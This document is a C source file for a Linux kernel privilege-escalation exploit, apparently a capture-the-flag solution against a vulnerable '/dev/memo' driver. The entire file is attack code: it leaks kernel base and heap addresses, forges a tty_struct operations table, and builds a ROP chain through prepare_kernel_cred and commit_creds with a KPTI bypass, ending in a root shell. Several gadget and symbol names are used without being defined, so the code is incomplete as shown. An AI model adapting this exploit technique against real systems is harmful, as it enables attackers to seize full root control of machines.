#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>

unsigned long kbase, kheap;
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;


struct message {
  unsigned long index;
  long size;
  char *buf;
};

void kmalloc(int fd, unsigned long idx, unsigned long size)
{
  struct message msg;
  msg.size = size;
  msg.index = idx;
  printf("[*] Allocating Chunk at: %ld of size: %ld\n", idx, size);
  if (ioctl(fd, 0x1000, &msg) == -1)
  {
   puts("Error!!");
   exit(1);
  }
}

void kfree(int fd, unsigned long idx)
{
 struct message msg;
 msg.index = idx;
 printf("[*] Free'ng index: %ld\n", idx);
 if (ioctl(fd, 0x1001, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}

void fill(int fd, unsigned long idx, unsigned int size, char *ptr)
{
 struct message msg;
 msg.buf = ptr;
 msg.index = idx;
 msg.size = size;
 printf("[*] Filling Chunk at Index: %ld with %s\n", idx, ptr);
 if (ioctl(fd, 0x1002,  &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}


void get(int fd, unsigned long idx, unsigned long size, char *ptr)
{
 struct message msg;
 msg.index = idx;
 msg.size = size;
 msg.buf = ptr;
 printf("[*] Reading data from index: %ld\n", idx);
	 if (ioctl(fd, 0x1003, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] Win!");
  execve("/bin/sh", argv, envp);
}

int main() {
  unsigned long buf[0x400 / sizeof(unsigned long)];
  save_state();

  /* open drivers */
  int fd = open("/dev/memo", O_RDWR);
  if (fd < 0) {
    perror("/dev/memo");
    return 1;
  }
  int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
  if (ptmx < 0) {
    perror("/dev/ptmx");
    return 1;
  }

  /* leak kbase & kheap */
  lseek(fd, 0x100, SEEK_SET);
  read(fd, buf, 0x400);
  kbase = buf[(0x300 + 0x18) / sizeof(unsigned long)] - ptm_unix98_ops;
  kheap = buf[(0x300 + 0x38) / sizeof(unsigned long)] - 0x38 - 0x400;
  printf("[+] kbase = 0x%016lx\n", kbase);
  printf("[+] kheap = 0x%016lx\n", kheap);

  /* write fake vtable, rop chain & overwrite ops */
  // fake tty_struct
  buf[(0x300 + 0x18) / sizeof(unsigned long)] = kheap + 0x100; // ops
  // fake tty_operations
  buf[12] = kbase + rop_push_r12_add_rbp_41_ebx_pop_rsp_r13; // ioctl
  // rop chain
  unsigned long *chain = &buf[0x100 / sizeof(unsigned long)];
  *chain++ = kbase + rop_pop_rdi;
  *chain++ = 0;
  *chain++ = kbase + prepare_kernel_cred;
  *chain++ = kbase + rop_pop_rcx;     // make rcx 0 to bypass rep
  *chain++ = 0;
  *chain++ = kbase + rop_mov_rdi_rax;
  *chain++ = kbase + commit_creds;    // cc(pkc(0));
  *chain++ = kbase + rop_bypass_kpti; // return to usermode
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_sp;
  *chain++ = user_ss;

  // overwrite!
  lseek(fd, 0x100, SEEK_SET);
  write(fd, buf, 0x400);

  /* ignite! */
  ioctl(ptmx, 0xdeadbeef, kheap + 0x200 - 8); // -8 for pop r13
  return 0;
}